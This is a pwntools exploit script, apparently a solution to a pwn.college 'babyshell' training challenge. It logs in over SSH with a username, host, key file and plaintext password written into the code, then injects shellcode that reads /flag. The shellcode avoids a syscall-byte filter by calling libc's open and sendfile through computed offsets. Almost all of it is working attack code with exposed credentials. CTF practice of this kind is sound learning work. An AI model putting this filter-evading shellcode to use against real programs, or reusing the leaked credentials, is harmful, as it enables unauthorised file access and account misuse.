from pwn import *

e = ELF('./babyshell_level6_teaching1')
libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')
p = s.run(['/babyshell_level6_teaching1'])
# p = e.process()

context.arch = e.arch
context.os = e.os
context.buffer_size = 0x4000

pay = shellcraft.open('/flag',0)
pay += shellcraft.sendfile(1,"rax",0,0xff)
print(pay)
oneshot = 0xe6e79
pay = f'''
mov rax, rcx
sub rax, {hex(libc.symbols['write']-23+0x2e)}
mov r8, rax
{shellcraft.open(b'/flag',0).replace('syscall','')}
mov rax, r8
add rax, {hex(libc.symbols['open'])}
call rax
{shellcraft.sendfile(1,'rax',0,0xff).replace('syscall','')}
mov rax, r8
add rax, {hex(libc.symbols['sendfile'])}
mov rcx, 0xff
call rax
'''
print(pay)
pay = asm(pay).replace(b'\x0f\x05',b'\x0e\x04')
# pay = pay
print(pay)
pause()
p.send(pay)

p.interactive()